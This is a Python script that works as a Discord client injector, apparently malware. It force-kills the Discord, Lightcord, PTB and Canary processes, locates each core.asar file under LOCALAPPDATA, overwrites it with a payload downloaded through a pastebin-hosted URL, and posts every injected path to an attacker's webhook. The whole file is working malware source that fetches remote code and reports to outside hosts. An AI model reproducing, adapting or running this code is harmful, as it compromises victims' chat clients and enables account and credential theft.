import os, requests, json

class Injector():
    def __init__(self, hook):
        self.hook= requests.get(hook).text
        self.injectable = [
            "ROAMING\\Discord\\",
            "ROAMING\\Lightcord\\",
            "ROAMING\\discordptb\\",
            "ROAMING\\discordcanary\\",
        ]

    def kill_process(self):
        os.system('taskkill /f /im discord.exe')
        os.system('taskkill /f /im lightcord.exe')
        os.system('taskkill /f /im discordptb.exe')
        os.system('taskkill /f /im discordcanary.exe')

    def get_injectable_path(self):
        injectable = []

        for injectable_path in self.injectable:
            injectable_path = injectable_path.replace('ROAMING', os.getenv('LOCALAPPDATA'))

            if os.path.exists(injectable_path):
                for path, folders, files  in os.walk(injectable_path):
                    if len(folders) != 0:
                        for path, folders, files  in os.walk(path):
                            if 'discord_desktop_core' in path:
                                if 'core.asar' in files:
                                    path = f'{path}\\core.asar'
                                    if path not in injectable:
                                        injectable.append(path)

        return injectable


    def inject(self):
        self.kill_process()
        payload = requests.get(requests.get('https://pastebin.com/raw/xxxxx').text).content # put core.asar url on pastebin
        
        for path in self.get_injectable_path():
            requests.post(self.hook, headers= {"content-type": "application/json"}, data= json.dumps({"username": "EL1T3 INJ3CT10N", "content": f"> **INJECTED:** ```{path}```"}))
            with open(path, 'wb') as core_file:
                core_file.write(payload)

Injector("https://pastebin.com/raw/xxxx").inject() # put webhook url on pastebin